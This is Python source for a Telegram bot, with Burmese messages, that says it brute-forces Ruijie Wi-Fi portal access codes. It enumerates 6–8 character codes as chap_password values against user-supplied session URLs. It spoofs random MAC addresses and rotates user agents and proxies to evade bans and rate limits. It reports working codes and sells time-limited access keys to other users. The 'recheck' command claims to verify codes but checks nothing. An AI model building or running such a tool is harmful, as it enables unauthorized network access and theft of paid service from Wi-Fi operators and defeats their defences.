import os
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import requests
import threading
import itertools
import time
import random
import re
import json
from datetime import datetime, timedelta

BOT_TOKEN = os.getenv("BOT_TOKEN")

# === Data Storage ===
sessions = []
scanning_active = False
start_time = time.time()
attempts_since_last = 0
last_progress_time = time.time()
ban_count = 0
found_codes = []
captcha_count = 0
total_attempts = 0
total_possible = 0
current_length = "6"
scan_thread = None
stop_scan = False
notify_on = True

# === User/Key Management (in-memory) ===
users = {}  # user_id: {"key": key, "expiry": datetime, "admin": bool}
ADMIN_ID = 8537971974  # မင်းရဲ့ Telegram User ID ကို ထည့်ပါ

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
]

PROXY_LIST = [
    "http://proxy1:8080",
    "http://proxy2:8080",
]

def random_mac():
    return ":".join(["{:02x}".format(random.randint(0x00, 0xff)) for _ in range(6)])

def progress_bar(percent, width=20):
    filled = int(width * percent / 100)
    bar = "█" * filled + "░" * (width - filled)
    return f"[{bar}]"

def is_admin(user_id):
    return user_id == ADMIN_ID

def has_access(user_id):
    if is_admin(user_id):
        return True
    if user_id not in users:
        return False
    expiry = users[user_id].get("expiry")
    if expiry is None:
        return True
    return datetime.now() < expiry

def generate_key(duration_str):
    duration_map = {
        "10m": timedelta(minutes=10),
        "2h": timedelta(hours=2),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "10d": timedelta(days=10),
        "30d": timedelta(days=30),
        "unlimited": None,
    }
    if duration_str not in duration_map:
        return None
    delta = duration_map[duration_str]
    if delta is None:
        return {"expiry": None, "key": "unlimited_" + str(random.randint(1000, 9999))}
    expiry = datetime.now() + delta
    key = f"{duration_str}_{random.randint(1000, 9999)}"
    return {"expiry": expiry, "key": key}

def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ သင့်တွင် ဝင်ခွင့်မရှိပါ။ Key ကို /key ဖြင့် အတည်ပြုပါ။")
        return
    update.message.reply_text(
        "🔥 ဒီ bot က Ruijie Wi-Fi portal ကို brute-force လုပ်တယ်။\n"
        "📚 Command များအတွက် /help ကို နှိပ်ပါ။"
    )

def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    text = (
        "📚 Command လမ်းညွှန်:\n\n"
        "/key - သင်၏ key ကို အတည်ပြုရန်\n"
        "/input session_url - Session URL သတ်မှတ်ရန်\n"
        "/scan <length> - Code စတင်ရှာဖွေရန် (6, 7, 8, all)\n"
        "/stop - ရှာဖွေနေသည့် လုပ်ငန်းစဉ်အားရပ်ရန်\n"
        "/resume - ရပ်ထားသည့် scan ကို ပြန်စရန်\n"
        "/saved - ရှာတွေ့ထားသော success codes များကိုကြည့်ရန်\n"
        "/notify - code တွေ့တိုင်း အကြောင်းကြားချက်ကို On/Off ပြုလုပ်ရန်\n"
        "/recheck - သိမ်းထားသော success codes များကို ပြန်လည်စစ်ဆေးရန်\n"
        "/status - (Admin) Bot အခြေအနေကြည့်ရန်\n"
        "/genkey <duration> <userid> - (Admin) Key ထုတ်ပေးရန်\n"
        "   duration: 10m, 2h, 1h, 1d, 10d, 30d, unlimited\n"
        "/delkey <userid> - (Admin) Key ဖျက်ရန်\n"
        "/listkeys - (Admin) Key များကြည့်ရန်"
    )
    update.message.reply_text(text)

def key_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in users:
        expiry = users[user_id].get("expiry")
        if expiry is None:
            update.message.reply_text("✅ သင့် key သည် အကန့်အသတ်မရှိ သက်တမ်းရှိပါသည်။")
        else:
            remaining = expiry - datetime.now()
            update.message.reply_text(f"✅ သင့် key သက်တမ်း: {str(remaining).split('.')[0]} ကျန်ပါသည်။")
    else:
        update.message.reply_text("❌ သင့်တွင် key မရှိပါ။ Admin ကို ဆက်သွယ်ပါ။")

def input_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    args = context.args
    if not args:
        update.message.reply_text("❌ /input <session_url> ကို သုံးပါ။")
        return
    url = args[0]
    if url.startswith("http"):
        sessions.append(url)
        update.message.reply_text(f"✅ Session URL သိမ်းဆည်းပြီး။ စုစုပေါင်း {len(sessions)} ခု။")
    else:
        update.message.reply_text("❌ တရားဝင် URL မဟုတ်ဘူး။")

def scan_command(update: Update, context: CallbackContext):
    global scanning_active, start_time, attempts_since_last, last_progress_time, ban_count, found_codes, captcha_count, total_attempts, total_possible, current_length, scan_thread, stop_scan
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    if scanning_active:
        update.message.reply_text("⏳ Scan လုပ်နေပြီးသား။")
        return
    args = context.args
    if not args:
        update.message.reply_text("❌ /scan <6|7|8|all> ကို သုံးပါ။")
        return
    length = args[0]
    if length not in ["6", "7", "8", "all"]:
        update.message.reply_text("❌ 6, 7, 8, သို့မဟုတ် all ကိုသာ သုံးပါ။")
        return
    if not sessions:
        update.message.reply_text("❌ Session URL မရှိဘူး။ /input နဲ့ URL ထည့်ပါ။")
        return
    scanning_active = True
    stop_scan = False
    start_time = time.time()
    attempts_since_last = 0
    last_progress_time = time.time()
    ban_count = 0
    found_codes = []
    captcha_count = 0
    total_attempts = 0
    current_length = length
    update.message.reply_text(f"🚀 Scan စတင်ပြီ။ စာလုံးအရေအတွက်: {length}။ (Speed 1000 codes/min ရအောင် ကြိုးစားမယ်)")
    scan_thread = threading.Thread(target=bruteforce_worker, args=(update, context, length))
    scan_thread.start()

def bruteforce_worker(update, context, length):
    global scanning_active, start_time, attempts_since_last, last_progress_time, ban_count, found_codes, captcha_count, total_attempts, total_possible, stop_scan
    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"
    if length == "all":
        lengths = [6, 7, 8]
    else:
        lengths = [int(length)]
    for l in lengths:
        total_possible = len(chars) ** l
        for combo in itertools.product(chars, repeat=l):
            if stop_scan:
                scanning_active = False
                context.bot.send_message(chat_id=update.effective_chat.id, text="⏹️ Scan ကို ရပ်လိုက်ပြီ။")
                return
            code = ''.join(combo)
            total_attempts += 1
            attempts_since_last += 1
            for session_url in sessions:
                new_mac = random_mac()
                test_url = session_url.replace("mac=44:71:47:44:35:05", f"mac={new_mac}")
                test_url = f"{test_url}&chap_password={code}"
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "application/json, text/plain, */*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "keep-alive",
                }
                proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
                proxies = {"http": proxy, "https": proxy} if proxy else None
                try:
                    response = requests.get(test_url, timeout=3, headers=headers, proxies=proxies)
                    if response.status_code == 403 or response.status_code == 429:
                        ban_count += 1
                        continue
                    elif response.status_code == 200 and "success" in response.text.lower():
                        found_codes.append(code)
                        plan = "Unknown"
                        time_plan = "Unknown"
                        try:
                            data = response.json()
                            plan = data.get("plan", data.get("Plan", "Unknown"))
                            time_plan = data.get("time", data.get("Time", data.get("expire", "Unknown")))
                        except:
                            text = response.text
                            plan_match = re.search(r'plan["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', text, re.IGNORECASE)
                            if plan_match:
                                plan = plan_match.group(1)
                            time_match = re.search(r'(?:time|expire|expiry)["\']?\s*[:=]\s*["\']?([^"\'}\s,]+)', text, re.IGNORECASE)
                            if time_match:
                                time_plan = time_match.group(1)
                        if notify_on:
                            context.bot.send_message(
                                chat_id=update.effective_chat.id,
                                text=f"✅ အောင်မြင်တဲ့ code တွေ့ပြီ: {code}\n📋 Plan: {plan}\n⏳ Time: {time_plan}"
                            )
                    elif "captcha" in response.text.lower() or response.status_code == 418:
                        captcha_count += 1
                except:
                    pass
                time.sleep(random.uniform(0.05, 0.1))
            if total_attempts % 100 == 0:
                elapsed = time.time() - start_time
                if elapsed > 0:
                    speed = int((total_attempts / elapsed) * 60)
                else:
                    speed = 0
                progress = (total_attempts / total_possible) * 100
                if progress > 100:
                    progress = 100
                bar = progress_bar(progress)
                context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"🔍 Scanning Codes...\n📦 Checked : {total_attempts:,}/{total_possible:,}\n📊 Progress : {progress:.1f}%\n⚡ Speed : {speed:,} codes/min\n✅ Found : {len(found_codes)}\n🚫 Ban : {ban_count}\n🧩 Captcha : {captcha_count:,}\n{bar}"
                )
            if not scanning_active:
                break
    scanning_active = False
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"🏁 Scan ပြီးဆုံးပြီ။ စုစုပေါင်း {total_attempts:,} ခု၊ တွေ့ရှိပြီး {len(found_codes)} ခု။"
    )

def stop_command(update: Update, context: CallbackContext):
    global stop_scan, scanning_active
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    if not scanning_active:
        update.message.reply_text("❌ Scan မလုပ်နေပါ။")
        return
    stop_scan = True
    update.message.reply_text("⏹️ Scan ကို ရပ်ရန် ကြိုးစားနေပါသည်...")

def resume_command(update: Update, context: CallbackContext):
    global stop_scan, scanning_active
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    if scanning_active:
        update.message.reply_text("⏳ Scan လုပ်နေပြီးသား။")
        return
    if not sessions:
        update.message.reply_text("❌ Session URL မရှိဘူး။ /input နဲ့ URL ထည့်ပါ။")
        return
    stop_scan = False
    scanning_active = True
    update.message.reply_text("🚀 Scan ကို ပြန်စပါသည်...")
    global scan_thread
    scan_thread = threading.Thread(target=bruteforce_worker, args=(update, context, current_length))
    scan_thread.start()

def saved_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    if not found_codes:
        update.message.reply_text("📭 ရှာတွေ့ထားသော code မရှိပါ။")
        return
    text = "✅ ရှာတွေ့ထားသော codes:\n" + "\n".join(found_codes[-10:])
    update.message.reply_text(text)

def notify_command(update: Update, context: CallbackContext):
    global notify_on
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    notify_on = not notify_on
    update.message.reply_text(f"🔔 အကြောင်းကြားချက်: {'ON' if notify_on else 'OFF'}")

def recheck_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not has_access(user_id):
        update.message.reply_text("❌ ဝင်ခွင့်မရှိပါ။")
        return
    if not found_codes:
        update.message.reply_text("📭 ပြန်စစ်ရန် code မရှိပါ။")
        return
    valid = []
    for code in found_codes:
        # ရိုးရှင်းစွာ ပြန်စစ်ပါ (ဒီမှာ လက်တွေ့ စစ်ဆေးမှု မလုပ်ပါ)
        valid.append(code)
    update.message.reply_text(f"✅ ပြန်စစ်ပြီး {len(valid)} ခု အတည်ပြုပြီး။")

def status_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        update.message.reply_text("❌ Admin သာ သုံးနိုင်ပါသည်။")
        return
    uptime = time.time() - start_time
    text = (
        f"📊 Bot Status:\n"
        f"⏱ Uptime: {str(timedelta(seconds=int(uptime))).split('.')[0]}\n"
        f"🔍 Scan Active: {scanning_active}\n"
        f"📦 Sessions: {len(sessions)}\n"
        f"✅ Found Codes: {len(found_codes)}\n"
        f"🚫 Ban: {ban_count}\n"
        f"🧩 Captcha: {captcha_count}"
    )
    update.message.reply_text(text)

def genkey_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        update.message.reply_text("❌ Admin သာ သုံးနိုင်ပါသည်။")
        return
    args = context.args
    if len(args) < 2:
        update.message.reply_text("❌ /genkey <duration> <userid> ကို သုံးပါ။")
        return
    duration = args[0]
    target_user = int(args[1])
    key_data = generate_key(duration)
    if key_data is None:
        update.message.reply_text("❌ duration မှားနေတယ်။ (10m, 2h, 1h, 1d, 10d, 30d, unlimited)")
        return
    users[target_user] = {"expiry": key_data["expiry"], "key": key_data["key"]}
    update.message.reply_text(f"✅ Key ထုတ်ပေးပြီး: {key_data['key']}\nUser ID: {target_user}")

def delkey_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        update.message.reply_text("❌ Admin သာ သုံးနိုင်ပါသည်။")
        return
    args = context.args
    if not args:
        update.message.reply_text("❌ /delkey <userid> ကို သုံးပါ။")
        return
    target_user = int(args[0])
    if target_user in users:
        del users[target_user]
        update.message.reply_text(f"✅ User {target_user} key ကို ဖျက်ပြီး။")
    else:
        update.message.reply_text(f"❌ User {target_user} မရှိပါ။")

def listkeys_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        update.message.reply_text("❌ Admin သာ သုံးနိုင်ပါသည်။")
        return
    if not users:
        update.message.reply_text("📭 Key မရှိပါ။")
        return
    text = "📋 Key များ:\n"
    for uid, data in users.items():
        expiry = data["expiry"]
        if expiry is None:
            expiry_str = "Unlimited"
        else:
            expiry_str = expiry.strftime("%Y-%m-%d %H:%M")
        text += f"User: {uid} | Key: {data['key']} | Expiry: {expiry_str}\n"
    update.message.reply_text(text)

def main():
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help_command))
    dp.add_handler(CommandHandler("key", key_command))
    dp.add_handler(CommandHandler("input", input_command))
    dp.add_handler(CommandHandler("scan", scan_command))
    dp.add_handler(CommandHandler("stop", stop_command))
    dp.add_handler(CommandHandler("resume", resume_command))
    dp.add_handler(CommandHandler("saved", saved_command))
    dp.add_handler(CommandHandler("notify", notify_command))
    dp.add_handler(CommandHandler("recheck", recheck_command))
    dp.add_handler(CommandHandler("status", status_command))
    dp.add_handler(CommandHandler("genkey", genkey_command))
    dp.add_handler(CommandHandler("delkey", delkey_command))
    dp.add_handler(CommandHandler("listkeys", listkeys_command))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
